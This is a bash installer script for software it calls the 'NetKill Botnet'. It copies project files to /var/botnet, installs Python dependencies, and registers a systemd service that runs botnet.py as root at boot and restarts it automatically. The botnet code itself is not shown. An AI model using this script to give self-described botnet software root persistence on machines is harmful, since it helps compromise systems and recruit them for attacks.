#!/bin/bash

# Must be run as root
if [[ "$EUID" -ne 0 ]]; then
  echo "❌ Please run as root"
  exit 1
fi

SERVICE_NAME="botnet.service"
TARGET_DIR="/var/botnet"
SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME"

echo "🛠️ Checking for existing installation..."

# If service exists or folder exists, remove them
if systemctl list-unit-files | grep -q "^$SERVICE_NAME"; then
  echo "⚠️ Existing service detected. Removing old service..."
  systemctl stop $SERVICE_NAME 2>/dev/null
  systemctl disable $SERVICE_NAME 2>/dev/null
  rm -f "$SERVICE_PATH"
fi

if [ -d "$TARGET_DIR" ]; then
  echo "🧹 Removing existing /var/botnet directory..."
  rm -rf "$TARGET_DIR"
fi

echo "📁 Creating /var/botnet directory..."
mkdir -p "$TARGET_DIR"

# Copy all files except setup.sh to /var/botnet/
shopt -s extglob
cp -r !("setup.sh") "$TARGET_DIR"

# Install Python requirements
if [[ -f "$TARGET_DIR/requirements.txt" ]]; then
  echo "📦 Installing Python dependencies..."
  pip install --break-system-packages -r "$TARGET_DIR/requirements.txt"
else
  echo "⚠️ No requirements.txt found, skipping dependency installation."
fi

# Create systemd service file
echo "📝 Creating systemd service..."
cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=NetKill Botnet
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /var/botnet/botnet.py
WorkingDirectory=/var/botnet/
User=root
Group=root
Restart=always
RestartSec=5
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd and enable/start the service
echo "🔁 Reloading and starting service..."
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME

echo "✅ Fresh botnet.service setup complete and running"
